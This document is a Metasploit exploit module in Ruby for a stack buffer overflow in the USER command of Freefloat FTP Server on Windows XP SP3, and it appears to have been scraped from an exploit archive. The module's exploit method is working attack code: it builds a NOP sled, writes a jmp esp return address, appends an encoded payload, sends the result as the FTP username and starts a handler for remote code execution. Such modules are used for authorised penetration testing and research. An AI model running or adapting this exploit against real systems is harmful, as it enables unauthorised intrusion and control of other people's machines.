# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::Ftp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Freefloat FTP Server Username Stack Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a buffer overflow found in the USER command of the Freefloat FTP server.
            },
            &#039;Author&#039;         => [
                        &#039;0v3r&#039;,     # Initial Discovery
                        &#039;James Fitts&#039;   # Metasploit Module
                    ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/15689&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP SP3&#039;, { &#039;Ret&#039; => 0x77def069 } ], # jmp esp from ADVAPI32.dll
                ],
            &#039;DisclosureDate&#039; => &#039;Dec 05 2010&#039;,
            &#039;DefaultTarget&#039; => 0))
    end
 
    def exploit
        connect
 
        print_status("Trying target #{target.name}...")
 
        buf = make_nops(230) + [target.ret].pack(&#039;V&#039;)
        buf << make_nops(50)
        buf << payload.encoded
 
        send_cmd( [&#039;USER&#039;, buf] , false )
 
        handler
        disconnect
    end
 
end



